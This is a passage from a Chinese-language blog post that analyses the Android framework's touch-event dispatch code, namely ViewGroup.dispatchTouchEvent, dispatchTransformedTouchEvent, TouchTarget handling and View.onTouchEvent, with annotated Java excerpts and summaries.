child, <span class="keyword">null</span>)) &#123;</span><br><span class="line">                            ev.setTargetAccessibilityFocus(<span class="keyword">false</span>);</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 找到了目标子view，检查touchTarget链表中是否已经存在这个view</span></span><br><span class="line">                        newTouchTarget = getTouchTarget(child);</span><br><span class="line">                        <span class="keyword">if</span> (newTouchTarget != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="comment">// 链表中已经存在该view，说明该子view已经接收过按下（初始）的触摸事件，说明这是一个多点触摸的情况，把新的点加入touchTarget并退出子view遍历</span></span><br><span class="line">                        newTouchTarget.pointerIdBits |= idBitsToAssign;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">			</span><br><span class="line">                        resetCancelNextUpFlag(child);</span><br><span class="line">                        <span class="comment">// 在dispatchTransformedTouchEvent()方法中进行下一层的事件分发，如果该方法返回true，说明事件被后续的view处理了</span></span><br><span class="line">                        <span class="keyword">if</span> (dispatchTransformedTouchEvent(ev, <span class="keyword">false</span>, child, idBitsToAssign)) &#123;</span><br><span class="line">                            <span class="comment">// 保存mLastTouchDownTime、mLastTouchDownIndex、mLastTouchDownX、mLastTouchDownY</span></span><br><span class="line">                            mLastTouchDownTime = ev.getDownTime();</span><br><span class="line">                            <span class="keyword">if</span> (preorderedList != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; childrenCount; j++) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (children[childIndex] == mChildren[j]) &#123;</span><br><span class="line">                                        mLastTouchDownIndex = j;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                mLastTouchDownIndex = childIndex;</span><br><span class="line">                            &#125;</span><br><span class="line">                            mLastTouchDownX = ev.getX();</span><br><span class="line">                            mLastTouchDownY = ev.getY();</span><br><span class="line">                            <span class="comment">// 保存该view到touchTarget链表</span></span><br><span class="line">                            newTouchTarget = addTouchTarget(child, idBitsToAssign);</span><br><span class="line">alreadyDispatchedToNewTouchTarget = <span class="keyword">true</span>;</span><br><span class="line">                            <span class="keyword">break</span>; <span class="comment">// 退出对子view的遍历，一个事件只会被分发给一个子view</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        ev.setTargetAccessibilityFocus(<span class="keyword">false</span>);</span><br><span class="line">                    &#125; <span class="comment">// 这里是遍历view循环结束点</span></span><br><span class="line">		<span class="comment">// 清除preorderedList，避免view泄露</span></span><br><span class="line">                    <span class="keyword">if</span> (preorderedList != <span class="keyword">null</span>) preorderedList.clear();</span><br><span class="line">                &#125; <span class="comment">// 这里if (newTouchTarget == null &amp;&amp; childrenCount != 0) 判断结束点</span></span><br></pre></td></tr></table></figure>
<p>首先明确一点，这段代码整个都是在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (actionMasked == MotionEvent.ACTION_DOWN</span><br><span class="line">        || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN)</span><br><span class="line">        || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123;</span><br></pre></td></tr></table></figure>
<p>这个条件下的，也就是说这是一个<code>down</code>事件，标志着一个新触摸动作的开始（一个触摸动作一般是<code>down</code>-&gt;<code>move</code>-&gt;<code>up</code>这样的顺序）。</p>
<p>我们在这段代码中找到了目标<code>view</code>，然后进一步调用<code>dispatchTransformedTouchEvent()</code>方法继续向下分发，如果该方法返回<code>true</code>，那么说明下面的子<code>view</code>处理了该事件，所以我们将该<code>view</code>保存到<code>touchTarget</code>链表中，然后保存了一些用于后续判断的事件信息。来看几个这段代码中调用的方法：</p>
<h4 id="canViewReceivePointerEvents"><a href="#canViewReceivePointerEvents" class="headerlink" title="canViewReceivePointerEvents()"></a>canViewReceivePointerEvents()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">canViewReceivePointerEvents</span><span class="params">(@NonNull View child)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (child.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE</span><br><span class="line">            || child.getAnimation() != <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>检查是否可见，或存在动画。</p>
<h4 id="isTransformedTouchPointInView"><a href="#isTransformedTouchPointInView" class="headerlink" title="isTransformedTouchPointInView()"></a>isTransformedTouchPointInView()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isTransformedTouchPointInView</span><span class="params">(<span class="keyword">float</span> x, <span class="keyword">float</span> y, View child, PointF outLocalPoint)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">float</span>[] point = getTempPoint();</span><br><span class="line">    point[<span class="number">0</span>] = x;</span><br><span class="line">    point[<span class="number">1</span>] = y;</span><br><span class="line">    transformPointToViewLocal(point, child);</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> isInView = child.pointInView(point[<span class="number">0</span>], point[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (isInView &amp;&amp; outLocalPoint != <span class="keyword">null</span>) &#123;</span><br><span class="line">        outLocalPoint.set(point[<span class="number">0</span>], point[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> isInView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transformPointToViewLocal</span><span class="params">(<span class="keyword">float</span>[] point, View child)</span> </span>&#123;</span><br><span class="line">    point[<span class="number">0</span>] += mScrollX - child.mLeft;</span><br><span class="line">    point[<span class="number">1</span>] += mScrollY - child.mTop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!child.hasIdentityMatrix()) &#123;</span><br><span class="line">        child.getInverseMatrix().mapPoints(point);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将点值从屏幕坐标系转换到<code>view</code>的坐标系，然后检查是否在<code>view</code>的区域内。</p>
<h4 id="dispatchTransformedTouchEvent"><a href="#dispatchTransformedTouchEvent" class="headerlink" title="dispatchTransformedTouchEvent()"></a>dispatchTransformedTouchEvent()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">dispatchTransformedTouchEvent</span><span class="params">(MotionEvent event, <span class="keyword">boolean</span> cancel,</span></span></span><br><span class="line"><span class="function"><span class="params">    View child, <span class="keyword">int</span> desiredPointerIdBits)</span> </span>&#123;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">boolean</span> handled;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存原始action，便于从调用改变`event`状态后恢复</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> oldAction = event.getAction();</span><br><span class="line"><span class="comment">// 取消事件的情况比较特殊，我们不用做任何过滤或转换</span></span><br><span class="line"><span class="keyword">if</span> (cancel || oldAction == MotionEvent.ACTION_CANCEL) &#123;</span><br><span class="line">    event.setAction(MotionEvent.ACTION_CANCEL);</span><br><span class="line">    <span class="comment">// 如果没有子view作为分发目标，则调用super（View类）的分发方法</span></span><br><span class="line">    <span class="keyword">if</span> (child == <span class="keyword">null</span>) &#123;</span><br><span class="line">        handled = <span class="keyword">super</span>.dispatchTouchEvent(event);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 向子view进一步分发</span></span><br><span class="line">        handled = child.dispatchTouchEvent(event);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 恢复event状态</span></span><br><span class="line">    event.setAction(oldAction);</span><br><span class="line">    <span class="keyword">return</span> handled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤出需要的触摸点id</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> oldPointerIdBits = event.getPointerIdBits();</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> newPointerIdBits = oldPointerIdBits &amp; desiredPointerIdBits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (newPointerIdBits == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> MotionEvent transformedEvent;</span><br><span class="line"><span class="comment">// 如果所有触摸点都被使用，我们可以直接使用原event，如果不是，我们需要从中分离出一个新的transformedEvent副本再进行分发，这么做的是因为我们要保持原event的状态</span></span><br><span class="line"><span class="keyword">if</span> (newPointerIdBits == oldPointerIdBits) &#123;</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="keyword">null</span> || child.hasIdentityMatrix()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (child == <span class="keyword">null</span>) &#123;</span><br><span class="line">            handled = <span class="keyword">super</span>.dispatchTouchEvent(event);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">float</span> offsetX = mScrollX - child.mLeft;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">float</span> offsetY = mScrollY - child.mTop;</span><br><span class="line">            <span class="comment">// 计算并设置view偏移给event</span></span><br><span class="line">            event.offsetLocation(offsetX, offsetY);</span><br><span class="line">			<span class="comment">// 分发事件</span></span><br><span class="line">            handled = child.dispatchTouchEvent(event);</span><br><span class="line">			<span class="comment">// 恢复event原状态</span></span><br><span class="line">            event.offsetLocation(-offsetX, -offsetY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> handled;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 复制一个event</span></span><br><span class="line">    transformedEvent = MotionEvent.obtain(event);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 分离出的新的transformedEvent</span></span><br><span class="line">    transformedEvent = event.split(newPointerIdBits);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (child == <span class="keyword">null</span>) &#123;</span><br><span class="line">    handled = <span class="keyword">super</span>.dispatchTouchEvent(transformedEvent);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">float</span> offsetX = mScrollX - child.mLeft;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">float</span> offsetY = mScrollY - child.mTop;</span><br><span class="line">    transformedEvent.offsetLocation(offsetX, offsetY);</span><br><span class="line">    <span class="keyword">if</span> (! child.hasIdentityMatrix()) &#123;</span><br><span class="line">        transformedEvent.transform(child.getInverseMatrix());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handled = child.dispatchTouchEvent(transformedEvent);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 回收临时拷贝</span></span><br><span class="line">transformedEvent.recycle();</span><br><span class="line"><span class="keyword">return</span> handled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法中对触摸事件设置好正确的偏移后向目标子<code>view</code>进行分发，如果没有目标，则调用自身的父类，也就是<code>view</code>的分发方法进行处理。</p>
<h4 id="addTouchTarget"><a href="#addTouchTarget" class="headerlink" title="addTouchTarget()"></a>addTouchTarget()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> TouchTarget <span class="title">addTouchTarget</span><span class="params">(@NonNull View child, <span class="keyword">int</span> pointerIdBits)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> TouchTarget target = TouchTarget.obtain(child, pointerIdBits);</span><br><span class="line">    target.next = mFirstTouchTarget;</span><br><span class="line">    mFirstTouchTarget = target;</span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>mFirstTouchTartget</code>是链表头，新增的<code>touchTarget</code>被插入了表头位置。</p>
<h3 id="dispatchTouchEvent-ViewGroup-3"><a href="#dispatchTouchEvent-ViewGroup-3" class="headerlink" title="dispatchTouchEvent(ViewGroup)"></a>dispatchTouchEvent(ViewGroup)</h3><p>再回到这个主要方法中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 没找到可以接收事件的子view</span></span><br><span class="line">               <span class="keyword">if</span> (newTouchTarget == <span class="keyword">null</span> &amp;&amp; mFirstTouchTarget != <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="comment">// mFirstTouchTarget为链表头</span></span><br><span class="line">                   newTouchTarget = mFirstTouchTarget;</span><br><span class="line">                   <span class="comment">// 把newTouchTarget指向表尾</span></span><br><span class="line">                   <span class="keyword">while</span> (newTouchTarget.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">                       newTouchTarget = newTouchTarget.next;</span><br><span class="line">                   &#125;</span><br><span class="line">                   newTouchTarget.pointerIdBits |= idBitsToAssign;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>注意11、12行的两个右括号分别对应退出的是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!canceled &amp;&amp; !intercepted) &#123;</span><br></pre></td></tr></table></figure>
<p>与</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (actionMasked == MotionEvent.ACTION_DOWN</span><br><span class="line">        || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN)</span><br><span class="line">        || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123;</span><br></pre></td></tr></table></figure>
<p>这意味着我们已经处理完了没有被取消、当前<code>ViewGroup</code>拦截，并且为初始触摸事件(<code>Down</code>) 的情况的分发，但是要注意的是现在并没有退出函数，还要继续向下执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">if</span> (mFirstTouchTarget == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="comment">// 意味着还没有子view处理该触摸事件</span></span><br><span class="line">          <span class="comment">// 此时第三个参数为null，会向父亲View传递令其处理这个事件</span></span><br><span class="line">          handled = dispatchTransformedTouchEvent(ev, canceled, <span class="keyword">null</span>,</span><br><span class="line">                  TouchTarget.ALL_POINTER_IDS);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 说明已有子view处理过该事件序列(由`down`开始)，直接将事件分发给该view，当需要时取消事件</span></span><br><span class="line">          TouchTarget predecessor = <span class="keyword">null</span>;</span><br><span class="line">          TouchTarget target = mFirstTouchTarget;</span><br><span class="line">          <span class="keyword">while</span> (target != <span class="keyword">null</span>) &#123;</span><br><span class="line">              <span class="keyword">final</span> TouchTarget next = target.next;</span><br><span class="line">              <span class="keyword">if</span> (alreadyDispatchedToNewTouchTarget &amp;&amp; target == newTouchTarget) &#123;</span><br><span class="line">                  <span class="comment">// 该TouchTarget已经在前面的情况中被分发处理了，避免重复处理</span></span><br><span class="line">                  handled = <span class="keyword">true</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 如果被当前ViewGroup拦截，向下分发cancel事件</span></span><br><span class="line">                  <span class="keyword">final</span> <span class="keyword">boolean</span> cancelChild = resetCancelNextUpFlag(target.child)</span><br><span class="line">                          || intercepted;</span><br><span class="line">                  <span class="comment">// dispatchTransformedTouchEvent()方法成功向下分发取消事件或分发正常事件</span></span><br><span class="line">                  <span class="keyword">if</span> (dispatchTransformedTouchEvent(ev, cancelChild,</span><br><span class="line">                          target.child, target.pointerIdBits)) &#123;</span><br><span class="line">                      handled = <span class="keyword">true</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                	<span class="comment">// 如果发送了取消事件，则移除分发记录（链表移动操作）</span></span><br><span class="line">                  <span class="keyword">if</span> (cancelChild) &#123;</span><br><span class="line">                      <span class="keyword">if</span> (predecessor == <span class="keyword">null</span>) &#123;</span><br><span class="line">                          mFirstTouchTarget = next;</span><br><span class="line">                      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                          predecessor.next = next;</span><br><span class="line">                      &#125;</span><br><span class="line">                      target.recycle();</span><br><span class="line">                      target = next;</span><br><span class="line">                      <span class="keyword">continue</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              predecessor = target;</span><br><span class="line">              target = next;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> (canceled</span><br><span class="line">                || actionMasked == MotionEvent.ACTION_UP</span><br><span class="line">                || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123;</span><br><span class="line"><span class="comment">// 如果为up事件或者hover_move事件（一系列触摸事件结束），清除记录的信息</span></span><br><span class="line">            resetTouchState();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_UP) &#123;</span><br><span class="line">        	<span class="comment">// 清除保存触摸信息</span></span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> actionIndex = ev.getActionIndex();</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> idBitsToRemove = <span class="number">1</span> &lt;&lt; ev.getPointerId(actionIndex);</span><br><span class="line">            removePointersFromTouchTargets(idBitsToRemove);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!handled &amp;&amp; mInputEventConsistencyVerifier != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mInputEventConsistencyVerifier.onUnhandledEvent(ev, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回事件是否被处理的信息</span></span><br><span class="line">    <span class="keyword">return</span> handled;</span><br></pre></td></tr></table></figure>
<h3 id="dispatchTouchEvent-ViewGroup-小结"><a href="#dispatchTouchEvent-ViewGroup-小结" class="headerlink" title="dispatchTouchEvent(ViewGroup)小结"></a>dispatchTouchEvent(ViewGroup)小结</h3><p>现在我们再从头梳理一遍这个比较长的方法过程：</p>
<p>关键点：</p>
<ul>
<li><code>TouchTarget</code>链表保存了处理了初始触摸事件的子<code>View</code>，注意只有一系列触摸动作的初始事件（<code>Down</code>事件）才会找到对应的子<code>View</code>并生成<code>TouchTarget</code>的一个节点。后面的系列事件都会分发给<code>TouchTarget</code>链表中保存的子<code>View</code>，这也就意味着，如果一个子<code>View</code>没有处理初始的<code>Down</code>事件，那么它也就不会再接收到后面的<code>move</code> <code>up</code>等事件。</li>
<li>如果<code>onInterceptTouchEvent()</code>返回<code>true</code>，当前<code>ViewGroup</code>拦截了该事件，那么该事件不会再向下面分发，并且会向<code>TouchTarget</code>中保存的所有子<code>View</code>发送<code>cancel</code>事件提醒它们这一系列的事件已经因被拦截而取消了，同时还会移除分发记录，意味着后面的事件也不再会分发到子<code>View</code>。</li>
<li>如果是辅助功能的事件，那么会优先分发给支持辅助功能的<code>View</code>，如果不存在这样的<code>view</code>，则进行一般的事件分发。</li>
</ul>
<p>顺序（大致）：</p>
<ol>
<li>判断是否被拦截</li>
<li>如果未被拦截且为初始事件，找到可以处理事件的子<code>View</code>（在点击范围内且可被点击），分发事件后如果该子<code>View</code>处理了事件（<code>dispatchTouchEvent()</code>方法返回<code>true</code>）则存入<code>TouchTarget</code>链表并停止子<code>View</code>的遍历（后面的子<code>View</code>就没有机会再收到事件），如果该子<code>View</code>没有处理该事件，则继续遍历寻找</li>
<li>如果事件被拦截，向<code>TouchTarget</code>中的子<code>View</code>发送<code>cancel</code>事件</li>
<li>将未被2、3情况处理的事件分发给<code>TouchTarget</code>中的子<code>View</code>，如果<code>TouchTarget</code>为空，则交给<code>ViewGroup</code>本身父<code>View</code>的<code>dispatchTouchEvent()</code>方法处理</li>
</ol>
<h3 id="dispatchTouchEvent-View"><a href="#dispatchTouchEvent-View" class="headerlink" title="dispatchTouchEvent(View)"></a>dispatchTouchEvent(View)</h3><p>现在我们知道，当一个触摸事件分发到一个非<code>ViewGroup</code>的<code>View</code>或者<code>ViewGroup</code>不再向下分发该事件（没有处理事件的目标或者被本身拦截），那么<code>View</code>类的<code>dispatchTouchEvent()</code>将会被调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">dispatchTouchEvent</span><span class="params">(MotionEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 处理辅助功能事件的情况</span></span><br><span class="line">    <span class="keyword">if</span> (event.isTargetAccessibilityFocus()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isAccessibilityFocusedViewOrHost()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        event.setTargetAccessibilityFocus(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> result = <span class="keyword">false</span>;</span><br><span class="line">	<span class="comment">// 一致性检验，检查事件是否被改变</span></span><br><span class="line">    <span class="keyword">if</span> (mInputEventConsistencyVerifier != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mInputEventConsistencyVerifier.onTouchEvent(event, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> actionMasked = event.getActionMasked();</span><br><span class="line">    <span class="keyword">if</span> (actionMasked == MotionEvent.ACTION_DOWN) &#123;</span><br><span class="line">        <span class="comment">// 停止滚动（如果在）</span></span><br><span class="line">        stopNestedScroll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (onFilterTouchEventForSecurity(event)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; handleScrollBarDragging(event)) &#123;</span><br><span class="line">            <span class="comment">// 如果事件为鼠标拖动滚动条</span></span><br><span class="line">            result = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListenerInfo li = mListenerInfo;</span><br><span class="line">        <span class="keyword">if</span> (li != <span class="keyword">null</span> &amp;&amp; li.mOnTouchListener != <span class="keyword">null</span></span><br><span class="line">                &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED</span><br><span class="line">                &amp;&amp; li.mOnTouchListener.onTouch(<span class="keyword">this</span>, event)) &#123;</span><br><span class="line">            <span class="comment">// 如果注册了点击事件监听(onTouchListener)，并且当前view处于启动状态，并且调用注册的onTouch方法返回了true，说明事件被消耗，标记结果为true，（注意这个时候已经调用了`onTouch()`进行事件分发处理</span></span><br><span class="line">            result = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 如果没有被注册的onTouch方法消耗事件，那么调用View本身的onTouch方法，如果返回了true，说明事件被消耗，标记结果为true</span></span><br><span class="line">        <span class="keyword">if</span> (!result &amp;&amp; onTouchEvent(event)) &#123;</span><br><span class="line">            result = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 一致性检验，检查事件是否被改变</span></span><br><span class="line">    <span class="keyword">if</span> (!result &amp;&amp; mInputEventConsistencyVerifier != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mInputEventConsistencyVerifier.onUnhandledEvent(event, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果是up事件（系列触摸动作的终点），或者是cancel事件，或者是初始事件并且我们没对它进行处理（回忆前面的内容，如果没有处理down事件，那么也不会收到后面的事件），就停止滚动状态</span></span><br><span class="line">    <span class="keyword">if</span> (actionMasked == MotionEvent.ACTION_UP ||</span><br><span class="line">            actionMasked == MotionEvent.ACTION_CANCEL ||</span><br><span class="line">            (actionMasked == MotionEvent.ACTION_DOWN &amp;&amp; !result)) &#123;</span><br><span class="line">        stopNestedScroll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，<code>View</code>的<code>onDispatchTouchEvent()</code>方法主要是先检查是否注册了<code>onTouchListener</code>，如果注册了监听并且调用返回了<code>true</code>消耗了该事件，那么说明该<code>View</code>处理了该事件，也会收到后续的事件，如果没有注册监听或者没有消耗，就调用<code>View</code>本身的<code>onTouchEvent</code>方法，如果返回<code>true</code>则消耗事件。</p>
<p>下面来看<code>View</code>默认的<code>onTouchEvent()</code>方法：</p>
<h3 id="onTouchEvent"><a href="#onTouchEvent" class="headerlink" title="onTouchEvent()"></a>onTouchEvent()</h3><p>这个方法我们也拆开来看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTouchEvent</span><span class="params">(MotionEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">float</span> x = event.getX();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">float</span> y = event.getY();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> viewFlags = mViewFlags;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> action = event.getAction();</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">if</span> ((viewFlags &amp; ENABLED_MASK) == DISABLED) &#123;</span><br><span class="line">        <span class="keyword">if</span> (action == MotionEvent.ACTION_UP &amp;&amp; (mPrivateFlags &amp; PFLAG_PRESSED) != <span class="number">0</span>) &#123;</span><br><span class="line">          	<span class="comment">// 如果view被禁用且按下状态为true，取消接下状态</span></span><br><span class="line">            setPressed(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果该view被禁用，但是被设置为clickable或longClickable或contextClickable，仍然消耗该事件</span></span><br><span class="line">        <span class="keyword">return</span> (((viewFlags &amp; CLICKABLE) == CLICKABLE</span><br><span class="line">                || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE)</span><br><span class="line">                || (viewFlags &amp; CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果为该view设置了触摸事件代理，则转发到代理处理触摸事件</span></span><br><span class="line">    <span class="keyword">if</span> (mTouchDelegate != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mTouchDelegate.onTouchEvent(event)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>处理了<code>view</code>被禁用和设置了触摸事件代理的情况。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((viewFlags &amp; CLICKABLE) == CLICKABLE ||</span><br><span class="line">        (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE) ||</span><br><span class="line">        (viewFlags &amp; CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br></pre></td></tr></table></figure>
<p>注意下面的语句都是在该<code>view</code>可被点击的情况下执行的，并且一旦该判断成立，那么最终一定会返回<code>true</code>，也就是说，设置了可被点击的<code>view</code>在默认情况下一定会消耗触摸事件。</p>
<p>下面对不同的触摸事件类型分别作出处理，为了分析方便，我调换了各<code>case</code>的顺序：</p>
<h4 id="case-MotionEvent-ACTION-DOWN"><a href="#case-MotionEvent-ACTION-DOWN" class="headerlink" title="case MotionEvent.ACTION_DOWN:"></a>case MotionEvent.ACTION_DOWN:</h4><p>一个触摸动作的开始</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mHasPerformedLongPress = <span class="keyword">false</span>;</span><br><span class="line"><span class="comment">// 检查Button点击事件的特殊情况（下文讲）</span></span><br><span class="line"><span class="keyword">if</span> (performButtonActionOnTouchDown(event)) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 向上遍历view以检查是否处在一个可滚动的容器中</span></span><br><span class="line"><span class="keyword">boolean</span> isInScrollingContainer = isInScrollingContainer();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是在滚动容器中，稍延迟触摸反馈来应对这是一个滚动操作的情况</span></span><br><span class="line"><span class="keyword">if</span> (isInScrollingContainer) &#123;</span><br><span class="line">    mPrivateFlags |= PFLAG_PREPRESSED;</span><br><span class="line">    <span class="keyword">if</span> (mPendingCheckForTap == <span class="keyword">null</span>) &#123;</span><br><span class="line">      　<span class="comment">// 新建一个对象用于检测单击事件（下文讲）</span></span><br><span class="line">        mPendingCheckForTap = <span class="keyword">new</span> CheckForTap();</span><br><span class="line">    &#125;</span><br><span class="line">    mPendingCheckForTap.x = event.getX();</span><br><span class="line">    mPendingCheckForTap.y = event.getY();</span><br><span class="line">  　<span class="comment">// 